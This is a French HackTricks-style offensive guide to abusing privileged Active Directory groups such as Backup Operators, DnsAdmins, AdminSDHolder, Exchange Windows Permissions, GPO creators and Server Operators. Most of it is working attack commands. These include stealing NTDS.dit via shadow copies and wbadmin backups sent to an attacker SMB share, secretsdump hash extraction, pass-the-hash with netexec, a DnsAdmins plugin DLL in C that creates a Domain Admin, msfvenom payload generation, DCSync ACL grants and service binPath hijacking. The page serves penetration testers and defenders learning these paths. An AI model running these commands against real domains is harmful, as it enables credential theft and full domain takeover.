# Groupes privilégiés

{{#include ../../banners/hacktricks-training.md}}

## Groupes bien connus ayant des privilèges d'administration

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ce groupe peut créer des comptes et des groupes qui ne sont pas administrateurs du domaine. De plus, il permet la connexion locale au contrôleur de domaine (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
L'ajout de nouveaux utilisateurs est autorisé, ainsi que la connexion locale au DC.

## Groupe AdminSDHolder

La liste de contrôle d'accès (ACL) du groupe **AdminSDHolder** est cruciale car elle définit les autorisations pour tous les « groupes protégés » dans Active Directory, y compris les groupes à haut privilège. Ce mécanisme assure la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, en accordant des permissions complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur le contrôle total sur tous les groupes protégés. Si les permissions de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison du fonctionnement du système.

La documentation récente de Windows Server considère encore plusieurs groupes d'opérateurs intégrés comme des objets **protégés** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Le processus **SDProp** s'exécute sur le **PDC Emulator** toutes les 60 minutes par défaut, applique le `adminCount=1` et désactive l'héritage sur les objets protégés. Cela est utile à la fois pour la persistance et pour détecter des utilisateurs privilégiés obsolètes qui ont été retirés d'un groupe protégé mais conservent encore l'ACL sans héritage.

Les commandes pour examiner les membres et modifier les permissions incluent :
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, consultez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

L'appartenance à ce groupe permet la lecture des objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ceci est utile pour **récupérer des chemins de privilèges précédents**. Les objets supprimés peuvent encore exposer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, d'anciens SPNs, ou le DN d'un groupe privilégié supprimé qui peut ensuite être restauré par un autre opérateur.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Accès au contrôleur de domaine

L'accès aux fichiers sur le DC est restreint sauf si l'utilisateur fait partie du groupe `Server Operators`, ce qui modifie le niveau d'accès.

### Élévation de privilèges

En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les permissions des services. Le groupe `Server Operators`, par exemple, dispose d'un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'élévation de privilèges :
```cmd
C:\> .\PsService.exe security AppReadiness
```
Cette commande révèle que `Server Operators` ont un accès complet, leur permettant de manipuler des services pour obtenir des privilèges élevés.

## Backup Operators

L'appartenance au groupe `Backup Operators` donne accès au système de fichiers `DC01` grâce aux privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent la traversée de dossiers, l'énumération et la copie de fichiers, même sans permissions explicites, en utilisant le flag `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.

Pour lister les membres du groupe, exécutez :
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attaque locale

Pour exploiter ces privilèges localement, les étapes suivantes sont réalisées :

1. Importer les bibliothèques nécessaires :
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Activer et vérifier `SeBackupPrivilege` :
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accéder et copier des fichiers depuis des répertoires restreints, par exemple :
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

L'accès direct au système de fichiers du contrôleur de domaine permet le vol de la base de données `NTDS.dit`, qui contient tous les NTLM hashes des utilisateurs et des ordinateurs du domaine.

#### Utilisation de diskshadow.exe

1. Créez une shadow copy du lecteur `C` :
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copier `NTDS.dit` depuis la shadow copy :
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Sinon, utilisez `robocopy` pour copier des fichiers :
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraire `SYSTEM` et `SAM` pour la récupération des hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Récupérer tous les hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Après extraction : Pass-the-Hash vers DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Utilisation de wbadmin.exe

1. Configurez un système de fichiers NTFS pour le serveur SMB sur la machine attaquante et mettez en cache les identifiants SMB sur la machine cible.
2. Utilisez `wbadmin.exe` pour la sauvegarde système et l'extraction de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec les privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité permet un potentiel d'exploitation important.

Pour lister les membres du groupe DnsAdmins, utilisez:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire (CVE‑2021‑40469)

> [!NOTE]
> Cette vulnérabilité permet l'exécution de code arbitraire avec les privilèges SYSTEM dans le service DNS (généralement à l'intérieur des contrôleurs de domaine, DCs). Ce problème a été corrigé en 2021.

Les membres peuvent amener le serveur DNS à charger une DLL arbitraire (soit localement, soit depuis un partage distant) en utilisant des commandes telles que :
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Le redémarrage du service DNS (ce qui peut nécessiter des permissions supplémentaires) est nécessaire pour que la DLL soit chargée :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Pour plus de détails sur ce vecteur d'attaque, consultez ired.team.

#### Mimilib.dll

Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant afin d'exécuter des commandes spécifiques ou des reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Enregistrement WPAD pour MitM

DnsAdmins peuvent manipuler les enregistrements DNS pour effectuer des attaques Man-in-the-Middle (MitM) en créant un enregistrement WPAD après avoir désactivé la global query block list. Des outils comme Responder ou Inveigh peuvent être utilisés pour le spoofing et la capture du trafic réseau.

### Event Log Readers
Les membres peuvent accéder aux journaux d'événements, pouvant potentiellement y trouver des informations sensibles telles que des mots de passe en clair ou des détails d'exécution de commandes :
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Autorisations

Ce groupe peut modifier les DACLs de l'objet de domaine, ce qui peut potentiellement accorder les privilèges DCSync. Les techniques de privilege escalation exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Si vous pouvez agir en tant que membre de ce groupe, l'abus classique consiste à accorder à un principal contrôlé par un attaquant les droits de réplication nécessaires pour [DCSync](dcsync.md) :
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historiquement, **PrivExchange** enchaînait l'accès aux boîtes aux lettres, forçait l'authentification Exchange et utilisait le relais LDAP pour aboutir à ce même mécanisme. Même lorsque ce chemin de relais est atténué, l'appartenance directe à `Exchange Windows Permissions` ou le contrôle d'un serveur Exchange demeure une voie à haute valeur vers les droits de réplication de domaine.

## Hyper-V Administrators

Les Hyper-V Administrators disposent d'un accès complet à Hyper-V, qui peut être exploité pour prendre le contrôle des contrôleurs de domaine virtualisés. Cela inclut le clonage de DCs en production et l'extraction de NTLM hashes depuis le fichier `NTDS.dit`.

### Exploitation Example

L'abus pratique est généralement **l'accès hors ligne aux disques/checkpoints des DC** plutôt que les anciennes astuces LPE au niveau de l'hôte. Avec un accès à l'hôte Hyper-V, un opérateur peut créer un checkpoint ou exporter un contrôleur de domaine virtualisé, monter le VHDX, et extraire `NTDS.dit`, `SYSTEM`, et d'autres secrets sans toucher à LSASS à l'intérieur de la machine invitée:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
À partir de là, réutilisez le workflow `Backup Operators` pour copier `Windows\NTDS\ntds.dit` et les registry hives hors ligne.

## Group Policy Creators Owners

Ce groupe permet à ses membres de créer des Group Policies dans le domaine. Cependant, ses membres ne peuvent pas appliquer de Group Policies aux utilisateurs ou aux groupes, ni modifier les GPO existants.

La nuance importante est que **le créateur devient propriétaire du nouveau GPO** et obtient en général suffisamment de droits pour le modifier par la suite. Cela rend ce groupe intéressant lorsque vous pouvez soit :

- créer un GPO malveillant et convaincre un admin de le lier à une OU/domain cible
- modifier un GPO que vous avez créé et qui est déjà lié quelque part d'utile
- abuser d'un autre droit délégué qui vous permet de lier des GPOs, tandis que ce groupe vous donne la capacité de les modifier

L'abus pratique implique généralement d'ajouter une **Immediate Task**, un **startup script**, une **local admin membership**, ou un changement de **user rights assignment** via des SYSVOL-backed policy files.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Si vous éditez manuellement la GPO via `SYSVOL`, souvenez-vous que le changement seul ne suffit pas : `versionNumber`, `GPT.ini`, et parfois `gPCMachineExtensionNames` doivent également être mis à jour sinon les clients ignoreront le rafraîchissement de la stratégie.

## Gestion de l'organisation

Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial appelé **Organization Management** possède des capacités importantes. Ce groupe a le privilège d'**accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et conserve le **contrôle total de l'Unité d'Organisation (OU) 'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour une escalade de privilèges.

### Exploitation des privilèges et commandes

#### Print Operators

Les membres du groupe **Print Operators** disposent de plusieurs privilèges, y compris **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un contrôleur de domaine**, de l'arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, surtout si **`SeLoadDriverPrivilege`** n'est pas visible depuis un contexte non élevé, il est nécessaire de contourner User Account Control (UAC).

Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Sur les contrôleurs de domaine, ce groupe est dangereux car la stratégie par défaut des contrôleurs de domaine accorde **`SeLoadDriverPrivilege`** aux `Print Operators`. Si vous obtenez un token élevé pour un membre de ce groupe, vous pouvez activer le privilège et charger un pilote signé mais vulnérable pour passer au kernel/SYSTEM. Pour les détails sur la gestion des tokens, consultez [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Utilisateurs du Bureau à distance

Les membres de ce groupe se voient accorder l'accès aux PC via Remote Desktop Protocol (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Des informations supplémentaires sur l'exploitation de RDP peuvent être trouvées dans des ressources pentesting dédiées.

#### Utilisateurs de gestion à distance

Les membres peuvent accéder aux PCs via **Windows Remote Management (WinRM)**. L'énumération de ces membres s'effectue via :
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Pour les techniques d'exploitation liées à **WinRM**, une documentation spécifique doit être consultée.

#### Server Operators

Ce groupe dispose des autorisations pour effectuer diverses configurations sur les contrôleurs de domaine, notamment les privilèges de sauvegarde et de restauration, la modification de l'heure système et l'arrêt du système. Pour énumérer les membres, la commande fournie est :
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Sur les contrôleurs de domaine, `Server Operators` héritent généralement de suffisamment de droits pour **reconfigurer ou démarrer/arrêter des services** et reçoivent également `SeBackupPrivilege`/`SeRestorePrivilege` via la stratégie DC par défaut. En pratique, cela fait d'eux un pont entre **service-control abuse** et **NTDS extraction** :
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Si l'ACL du service accorde à ce groupe les droits change/start, pointez le service vers une commande arbitraire, démarrez-le en tant que `LocalSystem`, puis restaurez le `binPath` original. Si le contrôle des services est verrouillé, revenez aux techniques `Backup Operators` ci‑dessus pour copier `NTDS.dit`.

## Références <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
